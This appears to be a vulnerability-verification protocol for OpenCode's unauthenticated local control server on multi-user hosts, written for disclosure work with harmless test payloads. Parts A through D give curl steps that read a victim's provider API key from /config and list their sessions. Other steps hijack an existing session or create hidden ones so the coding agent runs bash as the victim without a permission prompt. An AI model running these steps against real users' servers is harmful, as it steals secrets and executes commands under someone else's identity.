# OpenCode shared-host security: independent verification protocol

Status: verification protocol for an independent reviewer (colleague hand-off)
Date: 2026-07-16
Author: agent-workflows session (opencode)
Target: OpenCode CLI/TUI. Findings so far verified on v1.18.2 (source refs at commit `70b56a0a9`).
Related: advisory `20260716-0850-01`, hardening how-to `20260716-0850-02`.

## Purpose and honesty note

This document asks you to independently reproduce and, importantly, to try to REFUTE a set of claims about OpenCode's local control server on a shared / multi-user host. Please treat it adversarially: the value is in what you can and cannot reproduce, and where our predictions are wrong.

WHAT HAS ACTUALLY BEEN TESTED so far (be skeptical of everything else):

- All of the author's tests were SAME-USER: one person driving their own throwaway `opencode serve` on `127.0.0.1`. No genuine cross-user (attacker UID != victim UID) test has been run yet.
- Confirmed same-user, v1.18.2: (a) no password set => `GET /app` returns 200 with no credentials; setting `OPENCODE_SERVER_PASSWORD` => 401 without creds, 200 with `-u opencode:<pw>`; (b) `POST /session` + `POST /session/{id}/message` ran a real tool call (`mkdir`) with NO permission prompt under default config; (c) unauthenticated `GET /config` returned the provider `apiKey` in cleartext; (d) a session the author created via the API did NOT appear in the author's TUI (the TUI only shows sessions it launched).
- NOT yet tested, and the main thing this protocol is for: whether one local user can do all of the above against ANOTHER local user's OpenCode server. That is the actual security claim and it is currently a PREDICTION, not a result.

Please record exact command output (status codes, JSON, `id` values) for each step, and your OS / OpenCode version.

## Background: what the server is

- The `opencode` TUI embeds an HTTP server (same code path as `opencode serve`), bound to `127.0.0.1` on an ephemeral port. There is no separate daemon: running the TUI opens the port. OpenCode runs ONE embedded server per TUI process.
- Auth is opt-in via the `OPENCODE_SERVER_PASSWORD` environment variable (HTTP Basic, username `opencode`). With no password, the authorization middleware is claimed to be a pass-through (all routes open). Source refs to check: `server/auth.ts:19,24-26`, `httpapi/middleware/authorization.ts:106-107,122,139`, `cli/network.ts:12-15`, `server/server.ts:200,214`.
- A key architectural fact that governs the cross-user questions: an OpenCode server process runs as the UID that STARTED it. Nothing in this API makes the server run as a different user. So "spawn a session for another user" can only mean "connect to a server that the other user already started, and create a session there." You cannot make OpenCode execute as a user who has no server running.

## Environment for the test

Ideal: one shared Linux host, two unprivileged accounts, `victim` and `attacker`, neither with sudo, on the same machine (an HPC login node is the realistic setting). If you only have one account, you can approximate the reachability tests but you CANNOT prove the cross-UID authority claim; note which you did.

Record: `uname -a`, `opencode --version`, and whether the two accounts are truly distinct UIDs (`id`).

## Part A: baseline (same-user, should reproduce the author's results)

Run as any one user. This confirms the primitives before the cross-user tests.

1. Start a server WITHOUT a password:

       opencode serve --port 47901 --hostname 127.0.0.1

   Expected log line: `opencode server listening on http://127.0.0.1:47901`.

2. From another shell (same user), confirm no auth:

       curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:47901/app          # predict 200 (no auth)
       curl -s http://127.0.0.1:47901/config | head -c 400                            # predict: shows provider apiKey

3. Create a session and drive a harmless tool call:

       SID=$(curl -s -X POST http://127.0.0.1:47901/session -H 'Content-Type: application/json' -d '{}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
       echo "session=$SID"
       curl -s -X POST "http://127.0.0.1:47901/session/$SID/message" -H 'Content-Type: application/json' \
         -d '{"parts":[{"type":"text","text":"Use the bash tool once to run: mkdir -p /tmp/aw-verify/A && echo AW-VERIFY-A"}]}'
       ls -d /tmp/aw-verify/A     # predict: created, no permission prompt appeared

4. Now restart the server WITH a password and confirm auth works:

       OPENCODE_SERVER_PASSWORD=verifypw opencode serve --port 47902 --hostname 127.0.0.1
       # other shell:
       curl -s -o /dev/null -w '%{http_code}\n' http://127.0.0.1:47902/app                      # predict 401
       curl -s -o /dev/null -w '%{http_code}\n' -u opencode:verifypw http://127.0.0.1:47902/app  # predict 200

Tear down both servers (Ctrl-C / kill) and remove `/tmp/aw-verify` when done.

## Part B: the cross-user questions (the point of this exercise)

Run these as the `attacker` account against the `victim` account. Question 1 has three sub-cases.

### B0: can the attacker even SEE the victim's port?

As `attacker`, with the `victim` running a server (see B1):

    ss -tlnp 2>/dev/null | grep 127.0.0.1        # can attacker see victim's listen port? (ss may hide the owning pid for other users)
    # /proc/net/tcp enumerates ALL local listeners regardless of owner:
    cat /proc/net/tcp | awk '$4=="0A"{print $2}'  # local listen sockets in hex ADDR:PORT; convert port from hex

Record whether the attacker can discover the victim's port with no privilege. Predicted: YES (loopback listeners are visible to all local users via `/proc/net/tcp`).

### B1 (Question 1, case a): victim HAS an OpenCode listener running (no password)

Against a victim with a listener up, the attacker has TWO distinct levers, and both must be tested: (B1a) HIJACK an existing session the victim already has open, and (B1b) CREATE a new stealth session. They differ in blast radius and in visibility, so test each.

As `victim`, start an interactive session with real context (this becomes the "existing session" target):

    opencode        # a normal TUI session; do some work so it has context, a cwd, loaded files
    # (or, if you cannot easily inspect a TUI's session id/port, use: opencode serve --port 47911 --hostname 127.0.0.1
    #  and create a "victim's own" session first so there is a pre-existing session to hijack)

As `attacker`, first recon the victim's server (substitute the discovered port, here 47911):

    # Read victim's config / secrets?
    curl -s http://127.0.0.1:47911/config | head -c 400
    # List victim's EXISTING sessions (this is how the attacker finds a live session to hijack):
    curl -s http://127.0.0.1:47911/session | head -c 800

Record whether `/session` lists the victim's real, in-use sessions and their ids/directories.

#### B1a: HIJACK an EXISTING victim session

Pick an id from the `/session` list above (the victim's real session) and inject a tool call into it:

    VID=<a session id from the victim's /session list>
    curl -s -X POST "http://127.0.0.1:47911/session/$VID/message" -H 'Content-Type: application/json' \
      -d '{"parts":[{"type":"text","text":"Use the bash tool once to run: id > /tmp/aw-verify/hijack_existing.txt; echo done"}]}'

As `victim`, check ownership AND watch the live TUI while the attacker runs the above:

    ls -l /tmp/aw-verify/hijack_existing.txt ; cat /tmp/aw-verify/hijack_existing.txt

PREDICTION (unverified): the injected turn runs AS THE VICTIM in that session (file owned by `victim`), inheriting the session's context and working directory. Whether the injected turn is VISIBLE in the victim's attended TUI is the still-open sub-claim (see Part D) - record exactly what the victim saw in real time, and whether it was distinguishable from the human's own input. Note: even if it IS visible, the attacker can act while the victim is away from the keyboard.

#### B1b: CREATE a STEALTH session

    SID=$(curl -s -X POST http://127.0.0.1:47911/session -H 'Content-Type: application/json' -d '{}' | python3 -c 'import sys,json;print(json.load(sys.stdin)["id"])')
    curl -s -X POST "http://127.0.0.1:47911/session/$SID/message" -H 'Content-Type: application/json' \
      -d '{"parts":[{"type":"text","text":"Use the bash tool once to run: id > /tmp/aw-verify/stealth_new.txt; echo done"}]}'

As `victim`, check ownership and whether this NEW session appeared anywhere in the TUI:

    ls -l /tmp/aw-verify/stealth_new.txt ; cat /tmp/aw-verify/stealth_new.txt

PREDICTION (unverified for cross-user; DEMONSTRATED same-user): the tool call runs as `victim`; the NEW session does NOT appear in the victim's attended TUI (the TUI only displays sessions it launched). This is the stealth vector.

#### B1 common notes

- If a password IS set on the victim's server, ALL of B1a/B1b should return 401. Record that the mitigation holds.
- Record file ownership for both files: both should be owned by `victim` if the cross-user authority claim holds.
- The real-world attacker uses BOTH: the existing-session hijack for context-rich actions in the victim's actual project, and the stealth session for persistence / exfiltration without a live footprint.

### B2 (Question 1, case b): victim has OpenCode installed but NO listener running

As `victim`: ensure no `opencode serve` and no `opencode` TUI is running (`pgrep -u victim -a opencode`).

As `attacker`, try to reach or start a victim server:

    ss -tlnp 2>/dev/null | grep -i opencode        # predict: nothing (no victim listener)
    # There is no port to connect to. Can the attacker cause a victim-owned server to start?
    # The attacker can only run processes as ATTACKER, so any 'opencode serve' they run is attacker-owned, not victim-owned.

PREDICTION (unverified): NO cross-user vector via this path. Without a running victim server there is no endpoint, and the attacker cannot start a process as the victim (that would itself require the ability to execute as the victim, i.e. the thing being tested). The only nuance to check: does OpenCode leave any auto-start hook, a stale unix socket, an at-exit relaunch, or a shared broker/registry that could be abused to trigger a victim-owned start? Look for: leftover listeners after TUI exit, any `~victim/.local/state/opencode` or lock/socket files an attacker can reach, any systemd user unit. Record findings even if negative.

### B3 (Question 1, case c): victim does NOT have OpenCode installed

PREDICTION (unverified): NOT APPLICABLE. With no OpenCode on the box for that user there is no server and no client path; this mechanism cannot target them. The only thing worth confirming: that installing OpenCode does not create a SYSTEM-wide (shared) listener or a multi-user service (it should be per-user, per-process, loopback). Confirm the install is per-user and starts nothing shared.

## Part C: does the injected tool call really bypass the permission prompt?

Under default config the author saw no permission gate on an API-driven `mkdir`. Verify, and try to make it prompt:

    # With a fresh server, set a restrictive permission and see if the API call is then gated:
    # (consult the docs for the current permission config shape; test both default and a locked-down profile)
    curl -s http://127.0.0.1:47901/config | python3 -c 'import sys,json;d=json.load(sys.stdin);print("permission:",d.get("permission"));print("agent.build.permission:",d.get("agent",{}).get("build",{}).get("permission"))'

Record whether ANY permission configuration causes an API-injected tool call to be blocked or to require approval. If a config makes API calls honor the permission policy, that is an important mitigation to document.

## Part D: isolate the visibility of the existing-session hijack (single-user version)

B1a tests the existing-session hijack cross-user; this Part isolates just the VISIBILITY question with a single user, which is easier to instrument. We proved that an attacker-CREATED session is invisible to the victim's TUI (B1b). We have NOT established whether injecting into the victim's OWN attended session (the same embedded server the TUI is using) shows in their TUI.

To test: as one user, start the TUI, identify the exact `ses_...` the TUI is driving and the port of that TUI's own embedded server, then from another shell `POST /session/{that-exact-id}/message` through THAT server and watch the live TUI. Record whether the injected turn appears, and whether it is visually distinguishable from the human's own typed input. This closes the visibility side of B1a; it does not affect the proven stealth-via-new-session finding (B1b).

## What to report back

For each of A, B0, B1a, B1b, B2, B3, C, D: the exact commands, exact output (status codes, JSON snippets, file ownership), your OS + OpenCode version, and a one-line verdict (reproduced / not reproduced / N/A / different result). For B1a and B1b specifically, report the file ownership (was it the victim?) AND what the victim saw live in their TUI. Please explicitly call out anything where reality differs from the PREDICTION labels above; those are the author's hypotheses, not established facts.

## Safety and ethics

Do this ONLY on a host and accounts you are authorized to test, ideally two test accounts you control. Do not run it against another person's real work session. Use harmless payloads (`mkdir`, `id`, `echo`) as above. Tear down all test servers and remove `/tmp/aw-verify` afterward. If the cross-user claims reproduce, this is a real vulnerability under coordinated disclosure (see advisory `20260716-0850-01`); handle results discreetly and route them back rather than posting publicly.
